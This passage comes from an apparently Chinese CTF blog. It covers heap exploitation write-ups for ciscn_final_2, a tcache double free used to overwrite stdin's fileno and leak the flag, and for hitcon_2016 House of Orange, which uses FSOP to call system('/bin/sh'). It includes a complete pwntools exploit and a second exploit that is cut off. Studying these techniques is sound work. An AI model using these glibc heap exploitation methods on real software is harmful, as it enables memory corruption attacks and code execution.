class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 ida 中搜索 <code>_IO_2_1_stdxxx_</code> 或者 <code>stdxx</code> 可以找到默认打开的三个文件描述符 FILE 结构体存储地址：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210083553.png" alt="image-20201210083553060"></p><p> gdb 调试中查看结构体内容：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210083345.png" alt="image-20201210083345062"></p><p><strong>_fileno</strong> 是当前文件流的文件描述符，上图是 stderr 对应就是 2 。</p><p>我们知道 stdin 文件描述符是 0 ，如果我们将 stdin 的 fileno 修改为 2 ，那么 stdin 就变成了 stderr 。</p><h2 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><p>原题环境是在 ubuntu18.04 旧版本 glibc ，也就是允许 tcache doublefree ，注意检查 glibc 版本。</p><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>在初始化函数中，打开 flag 的文件流，紧接着用 dup2 将原本文件描述符从 3 修改为 666 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line">  fd = open(<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no such file :flag&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  dup2(fd, <span class="number">666</span>);                                <span class="comment">// 改变文件描述符</span></span><br><span class="line">  close(fd);</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆申请有两种大小：0x20、0x30 ，数量没有限制。结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">int</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">short_int</span>&#123;</span></span><br><span class="line"> <span class="keyword">short</span> num;</span><br><span class="line">  <span class="keyword">short</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free 堆后没有将指针指令，造成 UAF 漏洞，还有一点就是 doublefree 需要处理 bool 这个全局变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">bool</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;TYPE:\n1: int\n2: short int\n&gt;&quot;</span>);</span><br><span class="line">    v1 = get_atoi();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> &amp;&amp; int_pt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(int_pt);</span><br><span class="line">      <span class="keyword">bool</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove success !&quot;</span>);                 <span class="comment">// UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> &amp;&amp; short_pt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(short_pt);</span><br><span class="line">      <span class="keyword">bool</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show 函数限制使用 3 次，还需要注意输出长度问题，也就是用于泄露地址时并不是完整的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line">  <span class="keyword">if</span> ( show_time-- )<span class="comment">//show_time=3</span></span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exit 函数有一段输出功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">bye_bye</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ……</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%99s&quot;</span>, v0);</span><br><span class="line">  ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>利用 exit 时 scanf 输出函数，就 stdin 的文件描述符修改为 666 ，那么输出就变成输出，将 flag 内容给输出出来。</p><p>double free tcache 泄露堆地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap address</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">heap_base = show(<span class="number">2</span>)-<span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><p>修改 chunk0 size ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># house of spirt</span></span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line"><span class="comment"># overwrite chunk0 size to 0x91</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x91</span>)</span><br></pre></td></tr></table></figure><p>多次释放 chunk0 最后放入 unsortedbin 泄露 libc 地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line"><span class="comment"># double free chunk0 into unsortedbin </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = show(<span class="number">1</span>) - <span class="number">96</span></span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>修改 stdin 的 fileno 为 666 ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write tcache fd </span></span><br><span class="line">add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of sprit</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">heap_base = show(<span class="number">1</span>) - <span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">231</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">666</span>)</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(binary=<span class="string">&quot;./ciscn_final_2&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_final_2&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;libc-2.27.so&quot;</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_final_2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">type</span>, num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># leak heap address</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">heap_base = show(<span class="number">2</span>)-<span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of spirt</span></span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line"><span class="comment"># overwrite chunk0 size to 0x91</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x91</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line"><span class="comment"># double free chunk0 into unsortedbin </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = show(<span class="number">1</span>) - <span class="number">96</span></span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">stdin_fileno = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">0x70</span></span><br><span class="line">log.info(<span class="string">&quot;stdin_fileno:&quot;</span>+<span class="built_in">hex</span>(stdin_fileno))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># write tcache fd </span></span><br><span class="line">add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of sprit</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">heap_base = show(<span class="number">1</span>) - <span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">231</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> i春秋 </tag>
            
            <tag> fileno </tag>
            
            <tag> housr of sprit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of orange</title>
      <link href="archives/625c64bd/"/>
      <url>archives/625c64bd/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://bbs.ichunqiu.com/thread-59550-1-1.html">https://bbs.ichunqiu.com/thread-59550-1-1.html</a></p></blockquote><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>house of orange 特殊之处是题目没有 free 函数等释放堆块函数。house of orange 核心思想通过漏洞实现 free 的效果。</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>能控制 topchunk size 位（堆溢出等）</li><li>能控制堆分配的大小</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当 topchunk 不能满足申请分配的大小时，topchunk 被释放进 unsortedbin ，实现没有 free 函数释放堆块。</p><p>扩展堆空间有 <code>mmap</code> 和 <code>brk</code> 两种方式，我们需要以 <code>brk</code> 拓展，需要绕过 libc 一些 check ：<strong>malloc 申请大小不能大于 <code>mmp_.mmap_threshold</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>总结伪造 topchunk 要求：</p><ul><li><p>伪造 size 需要对齐内存页</p><p>比如现在 topchunk size 为：<code>0x20fa1</code>，那么对齐内存页的 size 可以为：0xfa1、0x1fa1……</p></li><li><p>size 要大于 MINSIZE</p></li><li><p>prev_inuse 为 1</p></li><li><p>size 要小于等等申请 chunk_size+MINISIZE （才能让 topchunk 放入 unsortedbin）</p></li></ul><p>自此得到一个 unsortedbin 堆，用来泄露 libc 地址，实现 FSOP</p><h3 id="hitcon-2016-houseoforange"><a href="#hitcon-2016-houseoforange" class="headerlink" title="hitcon_2016_houseoforange"></a>hitcon_2016_houseoforange</h3><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><p>保护全开，实验环境在 Ubuntu16.04。</p><p>能自主控制分配堆大小，结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  *info;</span><br><span class="line">  chunk_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span>&#123;</span></span><br><span class="line">  price;</span><br><span class="line">  color;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 edit 函数中存在堆溢出：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216230021.png" alt="image-20201216230021762"></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>利用堆溢出将 topchunk size 改小，size 要求看前文。修改前 topchunk 和 heap 范围：</p><p>![image-20201216231726321](../../../../../Library/Application Support/typora-user-images/image-20201216231726321.png)</p><p>修改后情况：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216231929.png" alt="image-20201216231929179"></p><p>之后申请一个大于 topchunk 的堆，topchunk 就被放入 unsortedbin ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555557580a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557580a0</span><br></pre></td></tr></table></figure><p>申请一个 largebin 用于泄露 libc 和 堆地址。用的 malloc 分配，libc 读取 bk 位置信息即可，分配的是 largebin 在 fd_nextsize 和 bk_nextsize 都存放堆地址分别读出即可。堆地址在 FSOP 伪造 vtable 需要用到。</p><p>自此后面就是 FSOP 利用。劫持在 libc 中的 _IO_list_all 内容，将其内容指向可控地址伪造 _IO_FILE_plus 和 vtabel 。默认状态下的 _IO_list_all 指向的是 _IO_2_1_stderr_ ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216232611.png" alt="image-20201216232610931"></p><p>利用堆溢出修改在 unsortedbin 的 topchunk fd bk 指针，发起 unsortedbin attack 劫持 _IO_list_all 。这里修改完 fd bk 之后申请一个堆，topchunk unlink 就会修改 _IO_list_all 指向到 main_arena+88 ，这个区域前后我们还是不能控制，就利用 _chain 标志位指向下一个文件流，这个标志位的位置刚好是 unsortedbin 0x60 链表位置。因此将 topchunk size 覆盖为 0x60 ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216234838.png" alt="image-20201216234838174"></p><p>执行 _IO_flush_all_lockp 时逐个遍历文件流，遇到错误文件就跳过去处理 _chain 指向的下一个文件流，因此现在 topchunk 里面伪造一个 _IO_FILE_plus 结构体。</p><p>需要设置几个标志位绕过保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mode_offset=<span class="number">0x0</span>;</span><br><span class="line">writeptr_offset=<span class="number">0x1</span>;</span><br><span class="line">writebase_offset=<span class="number">0x0</span>;</span><br></pre></td></tr></table></figure><p>然后将 vtable 指针劫持会 topchunk 特定位置，让 __overflow 为 system ，文件流（topchunk）头部覆盖为 /bin/sh 作为参数传入。</p><p>成功结构体如下：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201217000607.png" alt="image-20201217000607071"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201217000644.png" alt="image-20201217000644542"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 